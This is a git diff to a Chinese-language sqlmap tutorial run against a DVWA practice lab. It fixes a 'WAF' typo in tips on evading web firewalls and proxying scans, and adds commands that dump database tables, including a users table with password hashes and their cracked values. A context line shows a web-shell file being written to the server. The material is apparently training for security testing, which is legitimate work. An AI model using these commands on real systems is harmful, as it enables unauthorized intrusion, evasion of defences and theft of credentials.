@@ -142,17 +142,17 @@ Oswald:sqlmap-dev oliver$ python sqlmap.py -g "inurl:\".php?id=1\""
 ```
 #### 5.2 设置http请求头的UA，--user-agent
 ```yaml
-一些默认请求的UR一般情况下会被WARF拦截，所以建议更换UA
+一些默认请求的UR一般情况下会被WAF拦截，所以建议更换UA
 ```
 #### 5.3 设置代理，--proxy
 ```yaml
-因为怕自己的ip被WARF干掉，所以在sqlmap扫描的时候，使用--proxy代理，代理的其他的机器上进行操作更安全
+因为怕自己的ip被WAF干掉，所以在sqlmap扫描的时候，使用--proxy代理，代理的其他的机器上进行操作更安全
 ```
 #### 5.4 随机使用user-agent，--random-agent
 ```yaml
-也是可以绕过WARF的
+也是可以绕过WAF的
 ```
-### 6、防止被WARF拦截，或者策略封堵的技巧
+### 6、防止被WAF拦截，或者策略封堵的技巧
 ```yaml
 1、--proxy
 2、--random-agent
@@ -267,3 +267,70 @@ Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulne
 --file-dest="/var/www/html/get_shell.php"
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/sql_map_4.png)
+### 13、获取表的数据
+```yaml
+--dump -D 库名称 -T 表名称
+```
+```shell script
+Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ddndkv9dm5rq80foq8top957j6; security=low" --dump -D dvwa -T users
+```
+#### 下载所有能下载的数据
+```yaml
+--dump-all 
+```
+```shell script
+Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ddndkv9dm5rq80foq8top957j6; security=low" --dump-all
+```
+#### 下载下来的所有表，都是csv文件
+```shell script
+Oswald:dump oliver$ pwd
+/Users/oliver/.local/share/sqlmap/output/172.16.120.252/dump
+```
+```shell script
+Oswald:dump oliver$ ls -l
+total 0
+drwxr-xr-x   4 oliver  staff   128  1 29 17:17 dvwa
+drwxr-xr-x  42 oliver  staff  1344  1 29 17:16 information_schema
+drwxr-xr-x   9 oliver  staff   288  1 29 17:17 mysql
+drwxr-xr-x   5 oliver  staff   160  1 29 17:17 performance_schema
+```
+```shell script
+Oswald:dump oliver$ cd dvwa/
+Oswald:dvwa oliver$ ls -l
+total 16
+-rw-r--r--  1 oliver  staff   56  1 29 17:17 guestbook.csv
+-rw-r--r--  1 oliver  staff  737  1 29 17:17 users.csv
+Oswald:dvwa oliver$ cat users.csv 
+user_id,user,avatar,password,last_name,first_name,last_login,failed_login
+1,admin,http://172.16.120.252/hackable/users/admin.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),admin,admin,2022-01-11 12:15:38,1
+2,gordonb,http://172.16.120.252/hackable/users/gordonb.jpg,e99a18c428cb38d5f260853678922e03 (abc123),Brown,Gordon,2021-12-27 12:46:26,0
+3,1337,http://172.16.120.252/hackable/users/1337.jpg,8d3533d75ae2c3966d7e0d4fcc69216b (charley),Me,Hack,2021-12-27 12:46:26,0
+4,pablo,http://172.16.120.252/hackable/users/pablo.jpg,0d107d09f5bbe40cade3de5c71e9e9b7 (letmein),Picasso,Pablo,2021-12-27 12:46:26,0
+5,smithy,http://172.16.120.252/hackable/users/smithy.jpg,5f4dcc3b5aa765d61d8327deb882cf99 (password),Smith,Bob,2021-12-27 12:46:26,0
+```
+#### csv的分隔符指定，和文件类别指定
+```yaml
+--csv-del=";"，指定csv文件分隔符是分号
+--dump-format：csv格式的，html格式的，sqlite格式的
+```
+### 14、爬网站的URL
+```yaml
+--crawl：--crawl=3，爬去深度为3层
+--batch：所有选择都是默认参数
+```
+### 15、预估完成时间
+```shell script
+--eta
+```
+### 16、重新注入，不是用缓存进行注入
+```shell script
+--fresh-queries
+```
+### 17、自定义文件保存路径
+```shell script
+--output-dir
+```
+### 18、测试WAF/IPS/IDS保护
+```shell script
+--identify-waf
+```
